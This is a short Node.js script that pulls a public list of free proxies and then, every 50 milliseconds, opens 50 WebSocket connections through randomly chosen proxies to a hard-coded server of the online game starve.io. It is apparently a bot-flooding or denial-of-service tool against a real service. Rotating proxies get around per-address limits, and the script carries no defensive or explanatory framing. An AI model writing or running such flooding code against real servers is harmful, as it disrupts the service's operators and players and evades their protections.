const axios = require("axios"),
    url = require("url"),
    proxyAgent = require("https-proxy-agent"),
    readline = require('readline');
const Socket = require("./include/Socket");

const miliseconds = 50,
    times = 50;

console.clear();
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
let lnk;
let sn;
lnk = `wss://sydney2.starve.io/server-au1`;
sn = 'team mode {18}'

axios.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=60000&country=all&ssl=all&anonymity=all&simplified=true").then(r => {
        const proxies = r.data.split("\r\n");
        console.log(`Loaded ${proxies.length > 1 ? proxies.length + ' proxies' : proxies.length + ' proxy'}`);
    
        axios.get("http://starve.io/datas/info.json").then(re => {
            const servers = re.data;
    
            setInterval(() => {
                for (let i = 0; i < times; i++) {
                    const serverId = Math.floor(Math.random() * servers.length);
    
                    //if (servers[serverId].i !== "sydney2.starve.io") {
                        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                        const options = url.parse("http://" + proxy);
                        const agent = new proxyAgent(options);
    
                        const instance = new Socket(`${lnk}`, agent).instance;
                    //}
                }
            }, miliseconds || 10)
        });
    
    });
    rl.close();

